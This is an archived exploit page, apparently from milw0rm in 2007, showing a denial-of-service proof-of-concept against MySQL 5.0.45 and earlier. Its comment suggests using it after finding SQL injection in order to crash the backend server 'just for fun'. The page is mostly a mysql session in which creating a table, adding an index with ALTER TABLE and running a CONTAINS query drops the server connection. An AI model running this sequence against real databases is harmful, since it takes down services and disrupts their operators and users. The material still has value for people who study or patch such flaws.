<html><head><title>MySQL <= 5.0.45 (Alter) Denial of Service Vulnerability</title></head><pre>/*
 * MySQL &lt;=6.0 possibly affected
 * Kristian Erik Hermansen
 * Credit: Joe Gallo
 * You must have ALTER permissions to exploit this bug!
 * Scenario: You found SQL injection, but you want to punch backend server
 * in the nuts just for fun.  Start with the ALTER TABLE statement on
 * a table and field you know to exist.  The first two SQL statements are
 * simply to demostrate reproducibility...
 */

&lt;snip&gt;
mysql&gt; CREATE TABLE `test` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `foo` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
Query OK, 0 rows affected

mysql&gt; SELECT * FROM test WHERE CONTAINS(foo, 'bar');
Empty set

mysql&gt; ALTER TABLE test ADD INDEX (foo(100));
Query OK, 0 rows affected
Records: 0  Duplicates: 0  Warnings: 0

mysql&gt; SELECT * FROM test WHERE CONTAINS(foo, 'bar');
ERROR 2013 : Lost connection to MySQL server during query
&lt;/snip&gt;

# milw0rm.com [2007-11-09]</pre></html>